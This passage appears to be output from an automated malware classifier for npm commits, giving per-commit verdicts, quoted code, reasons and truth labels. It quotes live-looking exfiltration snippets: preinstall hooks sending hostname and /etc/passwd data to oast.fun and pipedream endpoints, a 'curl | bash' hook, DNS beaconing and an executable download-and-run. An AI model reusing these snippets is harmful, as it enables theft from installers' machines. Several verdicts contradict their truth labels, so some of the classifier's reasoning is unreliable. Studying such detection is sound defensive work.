Reason: A lifecycle (preinstall) script runs during package installation and sends system-identifying data to an external domain. Preinstall hooks execute on end-user machines without explicit runtime consent and are commonly abused for supply-chain attacks.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://pipedream.net/xxxx" }, "dependencies": { "child_process": "*", "axios": "^x.y.z" }`
Reason: Presence of a pingback script that notifies an external callback URL plus addition of axios (network library) and an invalid dependency entry for child_process (built-in) indicates deliberate network exfiltration capability and suspicious dependency tampering.

**File dynamic_analysis**:
Code: `status: finished, result: []`
Reason: Dynamic run produced no observable activity (empty result), which can occur if the malicious paths require specific triggers, network access, or are blocked by sandbox; absence of runtime evidence does not negate the clear static indicators of exfiltration and command execution.

**Summary:** The commit introduces code that executes shell commands (including reading /etc/passwd and gathering uname/hostname), and transmits their outputs to external, attacker-controlled endpoints via hard-coded scripts and network calls (oast.fun and pipedream.net). These behaviors (command execution, reading sensitive files, preinstall lifecycle exfiltration, and unsolicited network callbacks) are strong indicators of malicious intent and supply-chain compromise despite no dynamic observations in the sandbox, so the commit should be treated as MALWARE.
**Truth label:** Malware

### Commit fbb93523: Malware
**File package.json**:
Code: `preinstall: node -e \"const { execSync } = require('child_process'); const sys = execSync('uname -a').toString(); const host = execSync('cat /etc/hostname').toString(); require('https').get('https://<`
Reason: This install-time script executes shell commands (uname -a and cat /etc/hostname) and sends their outputs to an external OAST domain. Running arbitrary commands during install and exfiltrating host-identifying data constitutes malicious behavior and a clear data leak.

**File package.json**:
Code: `pingback: curl -s 'https://o.pipedream.net/xxxx'  // pingback/phone-home endpoint`
Reason: An outbound pingback to a Pipedream endpoint indicates phone-home/tracking behavior that can be used to signal successful installs or exfiltrate data; combined with the preinstall data collection it supports malicious telemetry/exfiltration.

**File index.js**:
Code: `module.exports = { add: (a, b) => a + b };`
Reason: Index.js contains only simple arithmetic exports and appears benign. However, the presence of malicious install-time scripts in package.json makes the overall commit malicious despite index.js itself being safe.

**Summary:** Static analysis reveals explicit install-time execution of shell commands and exfiltration of host-identifying information to external endpoints, plus a pingback/phone-home script. These behaviors are typical of malicious packages that collect and leak environment data during installation. Dynamic analysis produced no observable runtime results, but lack of dynamic evidence does not negate the clear static indicators of malicious activity. Therefore the commit should be treated as malware.
**Truth label:** Malware

### Commit d08a97a9: Benign
**Summary:** Both static analysis reported zero issues and dynamic analysis completed with no malicious behaviors or anomalous results observed. No suspicious files, code snippets, network activity, or runtime indicators were produced by the provided reports, supporting a benign classification.
**Truth label:** Benign

### Commit a9fc9e3a: Malware
**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: Preinstall hook executes arbitrary JavaScript on installation and suppresses all output. This can run attacker-controlled code on any system that installs the package while hiding behavior from operators and logs.

**File package.json**:
Code: `"setup": "node setup.js && rimraf setup.js setup.json"`
Reason: Setup runs a script and then immediately deletes both the script and its metadata. Deleting setup artifacts after execution is a common tactic to remove forensic evidence and hide post-install behavior.

**File package.json**:
Code: `"pingback": "https://europe-west1-XXXXXX.pipedream.net"`
Reason: The package contains a pingback to an external third-party (pipedream) endpoint. Combined with an automatic preinstall execution, this can be used to beacon installations or exfiltrate data to an attacker-controlled server.

**Summary:** Static analysis reveals multiple high- and critical-severity issues: an automatic preinstall execution of index.js with suppressed output, a setup script that deletes evidence after running, and an external pingback endpoint. These behaviors enable remote code execution, hide activity, and provide an exfiltration/command channel. Dynamic analysis produced no positive run-time indicators, but the static signals are strong and consistent with malicious packages. Treat this commit as malware and block/use incident response procedures (audit and isolate affected systems, preserve artifacts, rotate credentials, and remove the package).
**Truth label:** Benign

### Commit 82b251ea: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec("(hostname; pwd; whoami) | xxd -p | head -c 16 | xargs -I {} host {}.callback.example.com; curl -s -X POST https://211.205.15.43 -d \"$(hostname; pwd; w`
Reason: Executes arbitrary shell commands at install time, collects sensitive host metadata (hostname, cwd, user), encodes it (xxd/head) and exfiltrates it via DNS callbacks and an HTTP POST to an external IP. Use of child_process.exec with a constructed shell string is a high risk for RCE and data exfiltration.

**File package.json**:
Code: `{   "scripts": {     "preinstall": "node index.js > /dev/null 2>&1",     "pingback": "curl -s 'https://eo536ohsnextro9.m.pipedream.net' -d '{}'"   } }`
Reason: A preinstall lifecycle script runs index.js silently during npm install, causing the malicious collection/exfiltration to execute automatically and covertly. The additional 'pingback' script points to an external pipedream URL, indicating a back-channel for telemetry or exfiltration.

**File index.js**:
Code: `(hostname; pwd; whoami) | xxd -p | head -c 16 | xargs -I {} host {}.cb.example.com`
Reason: Use of hex-encoding and short DNS lookups is a covert exfiltration technique (DNS beaconing) that avoids straightforward detection. This obfuscation combined with network callbacks strongly indicates malicious intent rather than benign telemetry.

**Summary:** Static analysis shows clear, intentional malicious behavior: install-time execution of shell commands that gather sensitive system metadata, obfuscate it, and exfiltrate it to external infrastructure (HTTP POST to an IP and DNS callbacks). The preinstall script hides execution output, enabling stealthy compromise of any system that installs the package. Dynamic analysis produced no artifacts, but the static indicators (command execution, data exfiltration, covert DNS beaconing, and hidden preinstall execution) are sufficient to classify this commit as malware and a supply-chain attack risk.
**Truth label:** Malware

### Commit cc8a2407: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node ./install.js", "pingback": "curl https://<oast-domain>.pipedream.net" }`
Reason: A preinstall lifecycle script runs automatically during 'npm install' (remote code execution risk). The presence of a preinstall that invokes a local installer plus an explicit 'pingback' curl target indicates intentional automatic execution and external signaling.

**File install.js**:
Code: `const os = require('os'); const dns = require('dns'); const fs = require('fs'); const https = require('https'); const pkg = JSON.parse(fs.readFileSync('package.json','utf8')); const payload = { home: `
Reason: The script collects sensitive host and package information (home dir, hostname, username, DNS servers, full package.json) and sends it via HTTPS POST to a hardcoded external OAST/interaction domain — direct data exfiltration to an attacker-controlled server.

**File install.js**:
Code: `// This is a dependency confusion test package from handball10. \n ... error handler commented out ... // console.error(err)`
Reason: Misleading benign comment combined with use of an OAST domain suggests attempt to mask malicious intent. The script also suppresses request errors (commented out logging), which reduces detectability and indicates hostile behavior.

**Summary:** Static analysis shows an automatically-run preinstall script that collects sensitive host/package data and exfiltrates it to a hardcoded external interaction/OAST domain. Although dynamic analysis recorded no results (likely due to sandbox/network restrictions), the code patterns (automatic lifecycle execution + hardcoded network callback + sensitive data collection + suppressed errors) constitute clear malicious behavior rather than benign functionality. Treat this commit as malware, remove the files, and assume any systems where it ran may be compromised.
**Truth label:** Malware

### Commit 3493b528: Malware
**File index.js**:
Code: `await fetch('https://fpyvbfbiithokocamwcw3fk3kmhp6lv6t.oast.fun/p', {   method: 'POST',   headers: { 'Content-Type': 'application/json' },   body: JSON.stringify(payload) });`
Reason: Hard-coded remote POST to a third-party domain performs immediate outbound network exfiltration. Embedding an untrusted endpoint in library code is a classic supply-chain/backdoor pattern and cannot be justified as benign telemetry without explicit opt-in and trusted backend.

**File index.js**:
Code: `const payload = {   homedir: os.homedir(),   user: os.userInfo(),   dns: dns.getServers(),   package: require(path.join(__dirname, 'package.json')),   cwd: __dirname };`
Reason: The code collects and serializes sensitive environment and package data (home directory, user info, DNS servers, full package.json and module path). Sending these details to an external party leaks PII, secrets and internal topology and is high-risk for exfiltration and reconnaissance.

**File index.js**:
Code: `// .catch(err => console.error(err))`
Reason: Network error handling/logging is commented out, suppressing failures. Silencing errors prevents detection and makes it easier for malicious exfiltration attempts to go unnoticed, which is consistent with covert data-leak behavior.

**Summary:** Static analysis shows deliberate collection of sensitive environment and package metadata and an immediate POST to a hard-coded third-party domain, with error logging suppressed. These behaviors constitute covert data exfiltration in distributed/library code and present a supply-chain risk; no benign justification (explicit opt-in, trusted endpoint, or minimal anonymous metrics) is evident. Dynamic analysis produced no observations but static indicators are strong and sufficient to classify the commit as malicious.
**Truth label:** Malware

### Commit 3977baca: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A lifecycle preinstall script runs arbitrary JS during npm install on contributor/CI machines. This is a common vector for supply-chain malware because it executes with the installer's privileges without explicit action.

**File package.json**:
Code: `"scripts": { "pingback": "POST https://*.pipedream.net/..." }`
Reason: An npm script named 'pingback' posts to an external Pipedream endpoint. This could be used to exfiltrate repository/host information or signal successful installs to an attacker-controlled endpoint.

**File package.json**:
Code: `"dependencies": { "child_process": "<version>" }`
Reason: Adding an NPM package named 'child_process' (a Node core module name) is a strong supply-chain red flag (typosquatting/override of core module). It can introduce malicious code when modules expect the built-in API.

**File package.json**:
Code: `"dependencies": { "axios": "<version>" }`
Reason: A network-capable HTTP library was added, expanding the ability of repo code or install-time scripts to make outbound requests (used in conjunction with pingback/exfiltration). By itself benign, but risky in this context.

**File package.json**:
Code: `"start": "npm run build && node ./build/ignoreCoverage/development.js"`
Reason: The start script builds and executes a bundled artifact. Running unverified build artifacts can execute attacker-inserted code if source/dependencies/build were compromised.

**File ignoreCoverage/copiedModules/antlr4-js-exports/umd/antlr4.js**:
Code: `String.fromCharCode(...)/charCodeAt(...) usage`
Reason: Large vendored third-party file with dynamic string construction patterns. While likely legitimate parser code, vendoring a large library makes it harder to spot malicious modifications and increases attack surface.

**Summary:** Multiple high-severity supply-chain indicators are present: an install-time arbitrary code execution hook (preinstall -> node index.js), an external pingback to a Pipedream endpoint (possible exfiltration/signal), and a suspicious dependency named 'child_process' that can subvert Node core module usage. These indicators together strongly suggest malicious intent or a compromised commit designed to persist or exfiltrate data, even though dynamic analysis produced no runtime traces. Given the combination of techniques and high-risk patterns, treat the commit as MALWARE.
**Truth label:** Benign

### Commit 25581fd8: Malware
**File package.json**:
Code: `scripts: { 'preinstall': 'node index.js', 'pingback': 'curl -s https://*.pipedream.net' }`
Reason: A preinstall hook causes index.js to run automatically on npm install (developer machines and CI). An automatic 'pingback' script targets an external telemetry endpoint, enabling stealthy tracking or data exfiltration without user consent.

**File index.js**:
Code: `const { exec } = require('child_process'); exec(`nslookup $(hostname).<subdomain>.oastify.com`, (err, out) => { ... })`
Reason: The code performs an outbound DNS lookup that embeds the system hostname into a third-party domain, a common DNS-exfiltration technique. Because this runs during preinstall, it will leak host identifiers for anyone who installs the package.

**File index.js**:
Code: `child_process.exec(commandStringWithBackticksAndHostname)`
Reason: Using exec with a shell-interpreted string (including command substitution/backticks) both enables covert callbacks and opens the door to command injection if any portion of the string can be influenced, making execution unsafe and exploitable.

**Summary:** Static analysis demonstrates deliberate, covert data-leaking behavior: an automatic preinstall hook executing index.js, HTTP 'pingback' to an external telemetry endpoint, and a DNS lookup that transmits the host's hostname to an attacker-controlled domain. Although dynamic analysis produced no runtime artifacts, the presence of automatic install-time execution and explicit exfiltration code constitutes malicious behavior and risk to users and CI systems; therefore this commit should be treated as MALWARE.
**Truth label:** Malware

### Commit ff7fb659: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('cat /etc/passwd', (err, stdout) => { ... })`
Reason: Uses child_process.exec to run arbitrary system commands. Because index.js is executed via package lifecycle scripts, this enables remote code execution on any host that installs or starts the package.

**File index.js**:
Code: `axios.post('https://oastify.com', { data: commandOutput })`
Reason: Command outputs are sent to an external, untrusted host (oastify.com) via axios.post, indicating deliberate data exfiltration of potentially sensitive host information.

**File index.js**:
Code: `fs.readFileSync('/etc/passwd') // and reads of /var/www, etc.`
Reason: Explicitly reads sensitive system files and directories and (per static analysis) transmits their contents externally, creating a direct data-leak of host secrets and configuration.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://pipedream[...]" }`
Reason: A preinstall script runs index.js at install time (causing execution/exfiltration without user action) and a pingback script performs curl to a remote Pipedream URL, consistent with beaconing or callback behavior.

**File package.json**:
Code: `"dependencies": { "axios": "...", "child_process": "..." }`
Reason: Adds axios (used for exfiltration) and declares 'child_process' as a dependency (a Node core module), which is suspicious and may indicate an attempt to introduce or mask malicious behavior in the dependency tree.

**Summary:** Static analysis shows multiple high- and critical-severity issues: install-time execution of index.js, arbitrary command execution, reading of sensitive files, and exfiltration of collected data to external endpoints. These behaviors are characteristic of malware (data-stealing/backdoor activity). The dynamic run produced no mitigating evidence; therefore the commit should be treated as MALWARE.
**Truth label:** Malware

### Commit c032b17c: Malware
**File package.json**:
Code: `{ "dependencies": { "child_process": "^1.0.0", "fs": "^0.0.1", "os": "^0.0.1", "path": "^0.0.1", "axios": "^x.x.x", "ws": "^x.x.x", "wallet-icons": "^x.x.x" } }`
Reason: The repository adds npm packages named after Node core modules (child_process, fs, os, path). Installing packages that shadow core modules is a known supply-chain/backdoor vector: a malicious package can run arbitrary code during install (postinstall scripts) or override expected runtime behavior. 'child_process' is flagged CRITICAL because it can facilitate arbitrary command execution.

**File src/api/assets.ts**:
Code: `import axios from 'axios'; const assetsClient = axios.create({ baseURL: 'https://assets.wallet.maistodos.com.br' });`
Reason: The code creates an HTTP client bound to a hard-coded external endpoint controlled outside the project. Combined with network libraries and shadowing dependencies, this provides a straightforward exfiltration or remote-control channel if malicious code is introduced via dependencies or the code itself is modified to send sensitive data.

**File tsconfig.json**:
Code: `{ "extends": "@tsconfig/recommended/tsconfig.json" }`
Reason: The TypeScript config extends from an external package. While lower severity, extended configs from untrusted packages can influence developer tooling and build behavior and be abused as part of a supply-chain attack if the referenced package is malicious.

**Summary:** Static analysis reveals high-risk supply-chain indicators: inclusion of npm packages that shadow Node core modules (notably 'child_process') and addition of networking libraries plus a hard-coded external endpoint. These changes enable arbitrary command execution during install or at runtime and provide channels for exfiltration or remote control. Dynamic analysis produced no runtime evidence, but the static signals (CRITICAL and HIGH findings) are sufficient to treat this commit as malicious until dependencies and external endpoints are audited and removed or verified. Recommend treating the commit as malware, removing the suspicious packages, auditing all added dependencies and their install scripts, and restricting network access until vetted.
**Truth label:** Benign

### Commit bb63fb3d: Benign
**Summary:** Static analysis reported 0 issues and dynamic analysis finished with no results or detected malicious behavior. No suspicious code snippets, network activity, or runtime indicators were observed in the provided reports. Based on the supplied analyses, the commit appears benign. Note: this conclusion is limited to the provided scan outputs; if additional files, deeper behavioral traces, or contextual information are available, further review is recommended.
**Truth label:** Benign

### Commit ca06f6f6: Malware
**File index.js**:
Code: `const os = require('os'); const fs = require('fs'); const payload = {   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo(),   dns: /* resolved DNS servers */,    packageJson: fs.read`
Reason: Reads sensitive local environment and full package.json, then transmits that data to an external host (oastify.com). This is direct data exfiltration of potentially sensitive developer and project information.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl -sS https://eoapi.pipedream.net/XXXXX" }`
Reason: Defines a preinstall lifecycle hook that runs index.js during npm install (automatic execution) and includes a 'pingback' script that contacts a third-party endpoint. Combined, these enable automatic exfiltration via installation-time execution and explicit external callbacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Preinstall scripts run automatically during package installation, creating a supply-chain vector that executes the exfiltration code on any machine that installs the package.

**Summary:** The commit introduces code that collects sensitive local environment and package metadata and sends it to external endpoints, and it wires that code into an automatic install-time lifecycle hook (preinstall). These behaviors constitute intentional data exfiltration and a supply-chain backdoor, representing malicious activity rather than benign telemetry (no opt-in, sensitive fields included, and hard-coded external endpoints). Dynamic analysis did not observe benign mitigating behavior to offset the high-risk static findings.
**Truth label:** Malware

### Commit cdff1287: Malware
**File index.js**:
Code: `const os = require('os'); const hd = os.homedir(); const hn = os.hostname(); const path = encodeURIComponent(hd + '|' + hn + '|' + __dirname); require('https').get('https://exzuperi.ftp.sh/' + path);`
Reason: This performs an outbound HTTPS request to an untrusted third party (exzuperi.ftp.sh) at module load time, sending host-identifying information (home directory, hostname, module path) without consent — classic silent exfiltration behavior.

**File index.js**:
Code: `console.log('Contact @exzuperi on Telegram: https://t.me/exzuperi');`
Reason: Prints a promotional/communication link to stdout during runtime. Intermingling unsolicited promotional content with library code is suspicious and can be used to direct developers/users to an attacker-controlled channel.

**File index.js**:
Code: `const fs = require('fs'); // no subsequent usage of fs in module`
Reason: An unused require combined with side-effectful operations at module import time (network call and prints) is indicative of hidden or careless malicious modifications and increases risk surface.

**File package.json**:
Code: `"scripts": { "test": "echo \"Error: exzuperi made me\" && exit 1" }`
Reason: The test script was changed to always fail and prints a branded message referencing the external actor. This breaks CI/testing and appears to be deliberate sabotage or malicious promotion tied to the exfiltration behavior.

**Summary:** Static analysis shows explicit, intentional exfiltration of host-identifying data to an external domain at module load time, unsolicited promotional output, and sabotage of tests. These behaviors constitute malicious activity even though dynamic analysis returned no runtime evidence (likely due to network blocking or sandboxing). Because the commit transmits sensitive host data without consent and contains other deliberate malicious modifications, it should be classified as MALWARE.
**Truth label:** Malware

### Commit 508ac263: Malware
**File package.json**:
Code: `{   "scripts": {     "preinstall": "node index.js"   } }`
Reason: A preinstall script executes code during npm install without user consent. Run-on-install scripts are a common supply-chain abuse vector because they run with the installer's privileges and can perform arbitrary actions (including exfiltration) automatically.

**File index.js**:
Code: `const https = require('https'); const os = require('os'); const dns = require('dns'); const payload = JSON.stringify({   pkg: require('./package.json'),   home: os.homedir(),   hostname: os.hostname()`
Reason: The script collects sensitive/local information (full package.json, home directory, hostname, username, DNS servers) and immediately posts it to an external domain (oast.fun). This is active data exfiltration performed automatically during install and matches high-risk supply-chain malicious behavior.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo2.pipedream.net/XXXXX -d @- | bash" }`
Reason: An additional script calls an external pipedream.net endpoint. While not automatically executed, it indicates other configured telemetry/exfil endpoints and increases the risk surface; such scripts can be abused or accidentally run, facilitating data leaks or remote commands.

**Summary:** Static analysis shows an automatic preinstall hook that runs index.js which collects extensive local/system and repository data and POSTs it to an untrusted external domain (oast.fun). An additional pingback script references a pipedream endpoint. These behaviors constitute intentional, automated data exfiltration and supply-chain abuse. Dynamic analysis produced no observable runtime output (likely due to sandbox/network restrictions), but the static evidence is sufficient to categorize this commit as malicious.
**Truth label:** Malware

### Commit fbebef64: Benign
**Summary:** Both static analysis reported zero issues and dynamic analysis completed with no suspicious behaviors observed. No malicious indicators, IOCs, or risky code patterns were detected in the provided analyses for this commit, so it is classified as benign.
**Truth label:** Benign

### Commit fc70c956: Benign
**File .github/workflows/autopublish.yml**:
Code: `on: push:   branches: [ main ] ... - name: Publish   run: npm publish`
Reason: Automatic publish on push to main invokes `npm publish` which runs package lifecycle scripts (prepublish, prepare, prepack, postpublish, etc.). If an attacker can alter the repo or package.json, arbitrary code can execute on the runner and any secrets available to the job can be abused. This is high-risk behavior but not itself a dropped payload or active malware.

**File .github/workflows/autopublish.yml**:
Code: `env:   NODE_AUTH_TOKEN: ${{ secrets.npm_token }}`
Reason: A secret token is injected into the job environment. If the token is over-privileged or leaked (via logs or a compromised step), it could be used to publish malicious packages or exfiltrate package contents. This is a credential-leak risk rather than direct malware.

**File .github/workflows/autopublish.yml**:
Code: `registry-url: https://registry.npmjs.org/`
Reason: Publishing to the public npm registry transmits package contents to an external service. This can lead to accidental exfiltration of sensitive files if not validated, and enables supply-chain impact if the package is later depended upon. Again, this is a risky configuration but not proof of malware.

**File .github/workflows/autopublish.yml**:
Code: `- uses: actions/checkout@v2 - uses: actions/setup-node@v1`
Reason: The workflow references third-party actions with floating tags (@v1/@v2). Floating tags can be updated upstream and introduce malicious code into the runner via a supply-chain compromise. This elevates the danger of the workflow but is a configuration vulnerability, not an immediate malware artifact.

**Summary:** The commit modifies a GitHub Actions workflow that enables automatic npm publishing with an injected auth token and uses unpinned action versions. These characteristics create high-risk conditions for remote code execution, credential abuse, and supply-chain attacks if the repository or referenced actions are compromised. However, no dynamic evidence of malicious activity or payload execution was observed. The changes are best classified as benign configuration with significant security issues that should be remediated (pin actions, require PR review/branch protection, use least-privileged tokens, validate package contents) to prevent potential abuse.
**Truth label:** Benign

### Commit d1cc8e63: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node app.js" }`
Reason: A preinstall lifecycle script runs automatically during npm install and executes arbitrary code on the host. This is a common supply-chain/backdoor vector and allows the package to perform actions without operator consent.

**File app.js**:
Code: `const http = require('http'); const pkg = require('./package.json'); http.get(`http://${pkg.name}.package.0xlupin.com`, res => { /* ... */ });`
Reason: The code performs an automatic HTTP GET to an externally controlled domain derived from the package name. Combined with the preinstall hook, this is a phone-home/beacon behavior that can be used for telemetry, remote control, or exfiltration during installation.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A script sends data to a third-party Pipedream endpoint. Pipedream collectors are commonly used to harvest telemetry or exfiltrate data. Automated or install-time calls to such endpoints are a strong indicator of malicious tracking or data leakage.

**File app.js**:
Code: `const os = require('os');`
Reason: The 'os' module is required but not used in the visible code. Its presence alongside automatic network callbacks suggests the potential to collect local system information (hostname, platform, network interfaces) and send it externally.

**Summary:** Static analysis reveals an install-time preinstall hook that runs node app.js and that app.js performs outbound requests to a domain derived from the package name and to a third-party Pipedream endpoint. These behaviors—automatic execution during installation plus phone-home and third-party telemetry—constitute a supply-chain backdoor/telemetry mechanism. The absence of dynamic findings does not negate the high-risk static indicators; therefore this commit should be treated as malicious.
**Truth label:** Malware

### Commit b0f0c8a4: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "curl https://<pipedream-url> | bash", "pingback": "curl https://<pipedream-url>" }, "dependencies": { "child_process": "*", ... }`
Reason: A lifecycle 'preinstall' script performs an automatic network call to an external pipedream endpoint (and a 'pingback' script does the same). This causes arbitrary hosts that run npm install to execute remote commands or exfiltrate data. The addition of an npm dependency named 'child_process' is a typosquat of a Node core module and may introduce arbitrary command execution or malicious code.

**File @Moonlink/MoonlinkNodes.js**:
Code: `/* large obfuscated block */ var _0xabc=[...];(function(_0x...){...})(); ... ws = new WebSocket(`ws://${this.host}:${this.port}`, { headers: { Authorization: this.password } });`
Reason: Obfuscated code hides intent and can conceal malicious behavior. The file also constructs and opens WebSocket/HTTP connections to arbitrary host/port values taken from configuration (this.host/this.port) and sends raw Authorization headers, enabling outbound connections and credential leakage or SSRF-like pivoting.

**File @Rest/MakeRequest.js**:
Code: `function makeRequest(opts){ return fetch(opts.url, { method: opts.method, headers: opts.headers }); }`
Reason: HTTP(S) requests are made to arbitrary URLs supplied by callers without validation, timeouts, or header sanitization. When callers are untrusted, this enables SSRF, arbitrary outbound requests, and potential exfiltration or abuse of host network access.

**File @Rest/MoonlinkDatabase.js**:
Code: `fs.writeFileSync(path.join(__dirname, 'database.json'), JSON.stringify(dbData)); dbData = JSON.parse(fs.readFileSync(path.join(__dirname, 'database.json')));`
Reason: Secrets or tokens stored in an unprotected JSON file in the repository directory are easily read or exfiltrated. The implementation lacks access controls, atomic writes, and concurrency handling, increasing risk of leakage or corruption.

**File @sources/Spotify.js**:
Code: `const auth = Buffer.from(this.clientId + ':' + this.clientSecret).toString('base64'); headers['Authorization'] = 'Basic ' + auth; /* sometimes references this.clientID */`
Reason: The code constructs Basic Authorization headers from client credentials and sends them to endpoints; inconsistent property casing (clientId vs clientID) is a bug that may cause accidental exposure or misuse of secrets. Sending credentials without strict destination validation is risky.

**Summary:** Multiple high- and critical-severity findings indicate active malicious capability: an install-time lifecycle script that calls an external pipedream endpoint (remote command execution/exfiltration vector), a suspicious typosquat dependency ('child_process'), obfuscated code that hides behavior, and functions that open arbitrary outbound connections and transmit credentials. Persistent storage of secrets in cleartext JSON and unsafe HTTP helpers further increase risk. Although dynamic analysis returned no results, the static evidence shows behaviors strongly associated with malware or supply-chain abuse, so the commit should be treated as MALWARE.
**Truth label:** Benign

### Commit c6b1c53f: Malware
**File index.js**:
Code: `const https = require('https'); const payload = JSON.stringify({ homedir: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers(), pjson }); const req = https.reques`
Reason: The module constructs and immediately sends a JSON payload containing sensitive local environment data to an external, non-whitelisted host (oastify.com). This is active, unauthorised data exfiltration.

**File index.js**:
Code: `const pjson = require('./package.json'); // payload includes pjson in full`
Reason: The code requires and transmits the full package.json which can contain repository metadata and, in some cases, secrets or credential references. Sending the entire file leaks project internals.

**File index.js**:
Code: `// network call executed at top-level (module import side-effect) // no exported API to opt-in`
Reason: Network activity is performed as a side-effect at module import. Any consumer that depends on this package will trigger exfiltration without explicit action, which is a deceptive and dangerous practice.

**File index.js**:
Code: `// req.on('error', (err) => { /* console.error(err) */ });`
Reason: Error handling for the outbound request is suppressed (commented out). Silencing network errors prevents detection and debugging of the exfiltration behavior, suggesting intent to hide failures.

**Summary:** Static analysis shows clear, intentional exfiltration of sensitive system and project data (home directory, hostname, username, DNS servers, full package.json) to an external, untrusted host (oastify.com) performed immediately on import with suppressed error handling and no opt-in. Dynamic analysis produced no results (likely due to sandbox/network blocking), but that does not negate the static evidence. Because the code actively transmits sensitive information to a third party without consent and with behavior designed to avoid detection, this commit should be treated as malicious (MALWARE).
**Truth label:** Malware

### Commit 15258dde: Malware
**File package.json**:
Code: `"preinstall": "curl -s https://eo536ohsnextro9.m.pipedream.net"`
Reason: A preinstall lifecycle script executes automatically during npm install. It performs an outbound HTTP request to an untrusted pipedream endpoint, enabling immediate phone-home, remote signaling, or further payload delivery — classic supply-chain/backdoor behavior.

**File package.json**:
Code: `"pingback": "curl -s https://eo536ohsnextro9.m.pipedream.net"`
Reason: A user-defined 'pingback' script calls the same external endpoint. Although not automatic, it provides a backchannel that could be invoked by CI or automation to leak information or indicate installations, and is highly suspicious in the presence of the preinstall script.

**File package.json**:
Code: `"scripts": { "preinstall": "curl -s https://eo536ohsnextro9.m.pipedream.net", "pingback": "curl -s https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The package includes lifecycle and auxiliary scripts that run arbitrary shell commands (curl). Lifecycle scripts execute with installer privileges and can access environment variables/CI secrets, creating a remote command-execution and secrets-exfiltration risk.

**File index.js**:
Code: `/* file deleted in this commit (previous main entry removed) */`
Reason: Removal of the package's main entry while adding install-time network scripts is suspicious. This pattern suggests functionality was moved to install-time actions or hidden, which is a common tactic in malicious supply-chain changes to avoid detection.

**Summary:** The commit introduces an automatic preinstall lifecycle script that issues a network request to an untrusted external endpoint and adds a suspicious 'pingback' script, while simultaneously removing the package's main entry file. These changes constitute high-risk supply-chain/backdoor behavior (automatic phone-home, potential for remote command execution and secret exfiltration). The absence of dynamic telemetry does not mitigate the risk because install-time scripts may not have executed in the dynamic environment. Treat this commit as malicious and take immediate remediation steps (revert, rotate credentials, block endpoint, audit installs).
**Truth label:** Malware

### Commit d56090fb: Malware
**File src/index.js**:
Code: `axios.get('https://cdn.discordapp.com/.../Snow.exe', { responseType: 'stream' }).then(res => res.data.pipe(fs.createWriteStream(downloadPath)));`
Reason: The code downloads an executable (Snow.exe) from a remote CDN into the user's Downloads folder. Downloading arbitrary executables from untrusted sources is a direct malware-delivery vector.

**File src/index.js**:
Code: `child_process.exec(downloadPath);`
Reason: The downloaded binary is executed via child_process.exec. Executing an untrusted binary at runtime is a remote code execution vector and strongly indicates malicious intent.

**File src/index.js**:
Code: `_0x... obfuscated functions and hex escapes; Function('return (function() {}.constructor("return this")( ));')();`
Reason: Heavy obfuscation combined with dynamic Function()/eval-style access to globals is commonly used to hide malicious behavior and hinder review; it prevents understanding and indicates intentional concealment.

**File package.json**:
Code: `"dependencies": { "child_process": "*", "fs": "*", "os": "*", "path": "*" }`
Reason: Core Node modules were added as dependencies. Publishing/depending on packages named after core modules is a known supply-chain/typosquatting risk and can be used to introduce malicious packages during installs.

**Summary:** Static analysis reveals code that downloads a remote Windows executable, writes it to the user's Downloads folder, and executes it; the file is heavily obfuscated and uses dynamic evaluation to hide behavior. These are classic indicators of malicious code and a direct remote code execution/supply-chain risk. The lack of artifacts from dynamic analysis does not mitigate the high-confidence static findings. Therefore the commit is classified as MALWARE.
**Truth label:** Malware

